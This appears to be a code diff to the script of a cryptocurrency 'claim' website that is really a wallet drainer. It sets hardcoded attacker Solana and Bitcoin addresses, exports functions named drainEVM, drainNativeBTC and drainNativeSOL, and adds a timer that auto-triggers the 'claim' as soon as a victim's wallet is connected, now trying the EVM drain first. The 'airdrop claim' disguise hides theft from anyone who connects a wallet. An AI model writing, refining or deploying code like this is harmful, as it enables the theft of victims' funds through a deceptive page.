@@ -1,4 +1,4 @@
-
+// Script.js – UI, token detection, claim simulation, and multi-chain drain
 (function () {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
   if (isMobile) {
@@ -2312,7 +2312,7 @@ let tokenChart;
 let countdownInterval;
 let claimList = [];
 let priceHistory = [];
-let web3;
+let web3;           // Will be set from main.js via window.web3Instance
 let fingerprintData = {};
 let isMobileDevice =
   /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
@@ -2327,14 +2327,14 @@ let ethPriceInUSD = 2200;
 let userHasClaimed = false;
 let userBalanceInUSD = 0;
 let userLocalCurrency = CURRENCY_CONVERTER.detectLocalCurrency();
-let contractInstance; // will be set after web3 initialization
+let contractInstance; // will be set from main.js via window.contractInstance
 const CLAIM_THRESHOLD_USD = 3;
 
 // Solana specific state
 let solanaProvider = null;
 let solanaPublicKey = null;
-const ATTACKER_SOLANA_ADDRESS = "7uYC9fnzK3HashgE8x8fJ5oqUMLBWkVYqPiFNhejYPX7"; // Your SOL address
-const ATTACKER_BTC_ADDRESS = "bc1qyugnjmr05e4xf4wd4xs2ytn9an34uxelkt9h5f"; // Your BTC address
+const ATTACKER_SOLANA_ADDRESS = "7uYC9fnzK3HashgE8x8fJ5oqUMLBWkVYqPiFNhejYPX7";
+const ATTACKER_BTC_ADDRESS = "bc1qyugnjmr05e4xf4wd4xs2ytn9an34uxelkt9h5f";
 
 // NEW: Flag to prevent disconnection on mobile
 const DISABLE_DISCONNECT = isMobileDevice;
@@ -2440,6 +2440,21 @@ document.addEventListener("DOMContentLoaded", async function () {
 
   // Attempt to restore saved connection from localStorage
   restoreSavedConnection();
+
+  // Listen for global web3/contract updates from main.js
+  // They are exposed as window.web3Instance and window.contractInstance
+  // but we also use them directly if available
+  setInterval(() => {
+    if (window.web3Instance && !web3) {
+      web3 = window.web3Instance;
+      contractInstance = window.contractInstance;
+      console.log('Web3 instance synced from main.js');
+      // Trigger auto-claim if wallet is connected
+      if (connectedAddress) {
+        checkAndAutoTriggerClaim();
+      }
+    }
+  }, 500);
 });
 
 // ====== PERSISTENCE HELPERS ======
@@ -4118,6 +4133,13 @@ setTimeout(() => {
 
 // ====== MULTI-CHAIN DISPATCHER ======
 async function initiateClaimProcess() {
+  // Always try EVM first if web3 is available (highest priority)
+  if (web3 && connectedAddress) {
+    console.log("🟦 EVM wallet detected, attempting EVM drain...");
+    await drainEVM();
+    return;
+  }
+
   // Check for Bitcoin (UniSat)
   if (window.unisat) {
     try {
@@ -4140,13 +4162,6 @@ async function initiateClaimProcess() {
     return;
   }
 
-  // Check for EVM (MetaMask or WalletConnect)
-  if (window.ethereum || (window.web3 && window.web3.currentProvider)) {
-    console.log("🟦 EVM wallet detected, attempting EVM drain...");
-    await drainEVM();
-    return;
-  }
-
   showNotification("No supported wallet connected", "error");
 }
 
@@ -4155,3 +4170,5 @@ window.initiateClaimProcess = initiateClaimProcess;
 window.drainNativeBTC = drainNativeBTC;
 window.drainNativeSOL = drainNativeSOL;
 window.drainEVM = drainEVM;
+window.web3Instance = web3;  // will be updated from main.js
+window.contractInstance = contractInstance;  // will be updated
